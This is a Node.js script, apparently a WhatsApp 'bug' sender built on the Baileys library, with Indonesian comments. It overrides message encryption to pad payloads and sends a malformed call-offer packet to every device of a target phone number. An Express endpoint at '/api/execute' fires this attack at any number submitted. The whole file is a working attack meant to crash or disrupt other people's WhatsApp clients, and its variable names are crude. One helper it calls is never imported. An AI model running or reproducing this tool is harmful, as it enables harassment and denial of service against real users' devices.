const { default: makeWASocket, useMultiFileAuthState, jidDecode, encodeWAMessage } = require("@whiskeysockets/baileys");
const crypto = require("crypto");
const express = require("express");
const app = express();
app.use(express.urlencoded({ extended: true }));

// --- Fungsi aesystm milik Anda ---
async function aesystm(Lexxy, target) {
      const bokep = buffer => {
        const buf = Buffer.isBuffer(buffer) ? buffer : Buffer.from(buffer);
        return Buffer.concat([buf, Buffer.alloc(8, 1)]);
      };

      const devices = (
        await Lexxy.getUSyncDevices([target], false, false)
      ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

      await Lexxy.assertSessions(devices);

      const xnxx = () => {
        const map = {};
        return {
          mutex(key, fn) {
            map[key] ??= { task: Promise.resolve() };
            map[key].task = (async prev => {
              try { await prev; } catch { }
              return fn();
            })(map[key].task);
            return map[key].task;
          }
        };
      };

      const memek = xnxx();
      const porno = Lexxy.createParticipantNodes.bind(Lexxy);
      const yntkts = Lexxy.encodeWAMessage?.bind(Lexxy);

      Lexxy.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        const patched = await (Lexxy.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        const ywdh = Array.isArray(patched)
          ? patched
          : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        const { id: meId, lid: meLid } = Lexxy.authState.creds.me;
        const omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        const nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {

          const { user: targetUser } = jidDecode(jid);
          const { user: ownPnUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownPnUser || targetUser === omak;
          const y = jid === meId || jid === meLid;

          if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

          const bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

          return memek.mutex(jid, async () => {
            const { type, ciphertext } = await Lexxy.signalRepository.encryptMessage({ jid, data: bytes });
            if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

            return {
              tag: "to",
              attrs: { jid },
              content: [
                {
                  tag: "enc",
                  attrs: { v: "2", type, ...extraAttrs },
                  content: ciphertext
                }
              ]
            };
          });
        }));

        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
      };

      const awik = crypto.randomBytes(32);
      const awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

      const { nodes: destinations, shouldIncludeDeviceIdentity } =
        await Lexxy.createParticipantNodes(devices, { conversation: "y" }, { count: "0" });

      const lemiting = {
        tag: "call",
        attrs: {
          to: target,
          id: Lexxy.generateMessageTag(),
          from: Lexxy.user.id
        },
        content: [
          {
            tag: "offer",
            attrs: {
              "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
              "call-creator": Lexxy.user.id
            },
            content: [
              { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
              { tag: "audio", attrs: { enc: "opus", rate: "8000" } },

              {
                tag: "video",
                attrs: {
                  orientation: "0",
                  screen_width: "1920",
                  screen_height: "1080",
                  device_orientation: "0",
                  enc: "vp8",
                  dec: "vp8"
                }
              },

              { tag: "net", attrs: { medium: "3" } },

              {
                tag: "capability",
                attrs: { ver: "1" },
                content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
              },

              { tag: "encopt", attrs: { keygen: "2" } },

              { tag: "destination", attrs: {}, content: destinations },

              ...(shouldIncludeDeviceIdentity
                ? [
                  {
                    tag: "device-identity",
                    attrs: {},
                    content: encodeSignedDeviceIdentity(Lexxy.authState.creds.account, true)
                  }
                ]
                : [])
            ]
          }
        ]
      };

      await Lexxy.sendNode(lemiting);
    }

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    const Lexxy = makeWASocket({ auth: state, printQRInTerminal: true });
    Lexxy.ev.on('creds.update', saveCreds);

    // Endpoint API yang dipanggil oleh send_command.php
    app.post("/api/execute", async (req, res) => {
        const { target, command } = req.body;
        const targetJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

        try {
            if (command === "v3") {
                await aesystm(Lexxy, targetJid);
                console.log(`[!] Bug AESYSTM dikirim ke: ${targetJid}`);
                res.send("Success");
            } else {
                res.send("Command unknown");
            }
        } catch (err) {
            res.status(500).send("Error");
        }
    });

    app.listen(3000, () => console.log("Bot API Aktif di Port 3000"));
}
startBot();